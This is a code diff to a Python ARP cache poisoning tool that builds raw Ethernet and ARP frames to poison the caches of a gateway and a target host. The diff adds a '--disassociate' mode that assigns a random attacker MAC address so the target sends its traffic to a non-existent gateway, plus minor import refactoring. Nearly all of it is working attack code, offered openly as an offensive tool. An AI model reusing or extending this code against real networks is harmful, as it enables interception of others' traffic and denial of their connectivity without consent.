@@ -9,9 +9,10 @@ A low-level ARP Cache Poisoning (a.k.a "ARP Spoofing") tool.
 
 import abc
 import argparse
+import functools
+import random
 import re
 import time
-from functools import partial
 from socket import htons, inet_aton, ntohs, socket, PF_PACKET, SOCK_RAW
 from struct import pack
 
@@ -106,8 +107,9 @@ class AttackPackets(object):
                                  + self.arp_pkt_to_target.payload
 
     def __build_eth_frames(self):
-        eth_frame = partial(EthernetFrame, source_hdwr=self.attacker_mac,
-                            ethertype=b'\x08\x06')
+        eth_frame = functools.partial(EthernetFrame,
+                                      source_hdwr=self.attacker_mac,
+                                      ethertype=b'\x08\x06')
         self.eth_frame_to_gateway = eth_frame(dest_hdwr=self.gateway_mac)
         self.eth_frame_to_target = eth_frame(dest_hdwr=self.target_mac)
 
@@ -133,6 +135,12 @@ class Spoofer(object):
 
 def spoof(args):
     """Controls the flow of execution of the ARP Spoofer tool."""
+
+    if args.disassociate is True:
+        hex_values = '0123456789ABCDEF'
+        args.attackermac = ':'.join(''.join(random.choices(hex_values, k=2))
+                                    for _ in range(6))
+
     packets = AttackPackets(attacker_mac=args.attackermac,
                             gateway_mac=args.gatemac, gateway_ip=args.gateip,
                             target_mac=args.targetmac, target_ip=args.targetip)
@@ -148,12 +156,18 @@ if __name__ == '__main__':
     parser = argparse.ArgumentParser(
         description='Execute ARP Cache Poisoning attacks (a.k.a "ARP '
                     'Spoofing") on local networks.')
+    attack = parser.add_mutually_exclusive_group(required=True)
     parser.add_argument('interface', type=str,
                         help='Interface on the attacker machine to '
                              'send/receive packets from.')
-    parser.add_argument('--attackermac', type=str, required=True, metavar='MAC',
+    attack.add_argument('--attackermac', type=str, metavar='MAC',
                         help='MAC address of the Network Interface Controller '
                              '(NIC) used by the attacker.')
+    attack.add_argument('--disassociate', action='store_true',
+                        help='Execute a disassociation attack in which a '
+                             'randomized MAC address is set for the attacker '
+                             'machine, effectively making the target host send '
+                             'packets to a non-existent gateway.')
     parser.add_argument('--gatemac', type=str, required=True, metavar='MAC',
                         help='MAC address of the NIC associated to the '
                              'gateway.')
